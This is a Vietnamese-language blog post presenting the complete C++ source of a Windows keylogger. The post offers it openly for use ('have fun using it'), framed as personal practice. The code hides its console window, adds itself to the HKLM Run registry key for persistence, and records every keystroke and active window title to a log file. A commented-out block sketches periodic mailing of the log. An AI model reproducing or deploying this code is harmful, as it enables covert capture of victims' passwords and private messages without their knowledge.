---
title: PoC Simple C++ Keyloger (GetASyncKeyState)
date: 3/6/2021
layout: single
header:
  teaser: /assets/images/madoc.jpg
--- 


# Ngôn Ngữ
[![Language](https://img.shields.io/badge/Lang-c++-blue.svg)](https://www.learncpp.com/)

## Mô Tả 
Tác giả: PapaMouse

Một keylogger nhỏ mà đã tạo với một vài tính năng. Nó không phải là một chương trình hoàn chỉnh vì vậy tôi chỉ đưa ra mã nguồn vì đây là thực hành cho bản thân tôi. Điều này không sử dụng móc bàn phím chung. Nó sử dụng GetASyncKeyState (), một sự thay thế có uy tín nhưng vẫn không phù hợp thực sự với KBDLLHOOKLES cũ. Nó tự động cài đặt chính nó trong sổ đăng ký khi chạy, vì vậy hãy lưu ý, nó cũng hiển thị tiêu đề cửa sổ nếu một cửa sổ mới được chọn. Chúc bạn sử dụng  vui vẻ, Code ở bên dưới.



# Mã
## C++
---
```cpp
#include <windows.h>
#include <stdio.h>
#include <winuser.h>
#include <time.h>
#include <sstream>

using namespace std;

#define BUFSIZE 80

int get_keys(void);

HWND CurrentWindow;
char sCurrentWindow[MAX_PATH];

time_t start;
time_t tick;
//time_t mailtime;
//time_t prevmailtime;

int main(void)
{
    HWND stealth; /*creating stealth (window is not visible)*/
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);

    SetPriorityClass(GetCurrentProcess(),IDLE_PRIORITY_CLASS);

    CurrentWindow = GetForegroundWindow();
    GetWindowText(CurrentWindow,sCurrentWindow,BUFSIZ+1);
    printf("[%s]\n",sCurrentWindow);

    char *path="c:\\kl.exe"; //the path in which the file needs to be?

    HKEY hkey;

    RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);
    RegSetValueEx((HKEY)hkey,"kl",0,REG_SZ,(BYTE *)path,strlen(path));

    int t=get_keys();

    start = time(NULL);

    return t;
}

int get_keys()
{
    short character;
    while(!GetAsyncKeyState(VK_ESCAPE))
    {
        if (tick > start)
        {
            start = time(NULL);
            tick = time(NULL);

            if(GetForegroundWindow() != CurrentWindow)
            {
                CurrentWindow = GetForegroundWindow();
                GetWindowText(CurrentWindow,sCurrentWindow,BUFSIZ+1);

                FILE *file;
                file=fopen("recorded.log","a+");

                if(file==NULL)
                {
                     return 1;
                }

                stringstream ss;
                ss << sCurrentWindow << "\n";

                fputs(ss.str().c_str(),file);

                fclose(file);
            }
        }


    for(character=8;character<=222;character++)
    {
    if(GetAsyncKeyState(character)==-32767)
    {
        FILE *file;
         file=fopen("recorded.log","a+");
         if(file==NULL)
         {
                 return 1;
         }

         if(file!=NULL)
         {
                 if((character>=39)&&(character<=64))
                 {
                       fputc(character,file);
                       fclose(file);
                       break;
                 }
                 else if((character>64)&&(character<91))
                 {
                       character+=32;
                       fputc(character,file);
                       fclose(file);
                       break;
                 }
                 else
                 {
                     switch(character)
                     {
                           case VK_SPACE:
                           fputc(' ',file);
                           fclose(file);
                           break;
                           case VK_SHIFT:
                           fputs("[SHIFT]",file);
                           fclose(file);
                           break;
                           case VK_RETURN:
                           fputs("\n[ENTER]",file);
                           fclose(file);
                           break;
                           case VK_BACK:
                           fputs("[BACKSPACE]",file);
                           fclose(file);
                           break;
                           case VK_TAB:
                           fputs("[TAB]",file);
                           fclose(file);
                           break;
                           case VK_CONTROL:
                           fputs("[CTRL]",file);
                           fclose(file);
                           break;
                           case VK_DELETE:
                           fputs("[DEL]",file);
                           fclose(file);
                           break;
                           case VK_OEM_1:
                           fputs("[;:]",file);
                           fclose(file);
                           break;
                           case VK_OEM_2:
                           fputs("[/?]",file);
                           fclose(file);
                           break;
                           case VK_OEM_3:
                           fputs("[`~]",file);
                           fclose(file);
                           break;
                           case VK_OEM_4:
                           fputs("[ [{ ]",file);
                           fclose(file);
                           break;
                           case VK_OEM_5:
                           fputs("[\\|]",file);
                           fclose(file);
                           break;
                           case VK_OEM_6:
                           fputs("[ ]} ]",file);
                           fclose(file);
                           break;
                           case VK_OEM_7:
                           fputs("['\"]",file);
                           fclose(file);
                           break;
                           /*case VK_OEM_PLUS:
                           fputc('+',file);
                           fclose(file);
                           break;
                           case VK_OEM_COMMA:
                           fputc(',',file);
                           fclose(file);
                           break;
                           case VK_OEM_MINUS:
                           fputc('-',file);
                           fclose(file);
                           break;
                           case VK_OEM_PERIOD:
                           fputc('.',file);
                           fclose(file);
                           break;*/
                           case VK_NUMPAD0:
                           fputc('0',file);
                           fclose(file);
                           break;
                           case VK_NUMPAD1:
                           fputc('1',file);
                           fclose(file);
                           break;
                           case VK_NUMPAD2:
                           fputc('2',file);
                           fclose(file);
                           break;
                           case VK_NUMPAD3:
                           fputc('3',file);
                           fclose(file);
                           break;
                           case VK_NUMPAD4:
                           fputc('4',file);
                           fclose(file);
                           break;
                           case VK_NUMPAD5:
                           fputc('5',file);
                           fclose(file);
                           break;
                           case VK_NUMPAD6:
                           fputc('6',file);
                           fclose(file);
                           break;
                           case VK_NUMPAD7:
                           fputc('7',file);
                           fclose(file);
                           break;
                           case VK_NUMPAD8:
                           fputc('8',file);
                           fclose(file);
                           break;
                           case VK_NUMPAD9:
                           fputc('9',file);
                           fclose(file);
                           break;
                           case VK_CAPITAL:
                           fputs("[CAPS LOCK]",file);
                           fclose(file);
                           break;
                           default:
                           fclose(file);
                           break;
                    }
                }
            }
        }
    }

//    mailtime = time(NULL);

//    if (mailtime % 30 == 0 && prevmailtime != mailtime) //30 seconds and not the same message
//    {
//        WinExec("report.exe",0); //would be used to do mailing but that's for private etc.
//        prevmailtime = mailtime;
//    }

    }


    return EXIT_SUCCESS;
}
```







## Chúc May Mắn :D
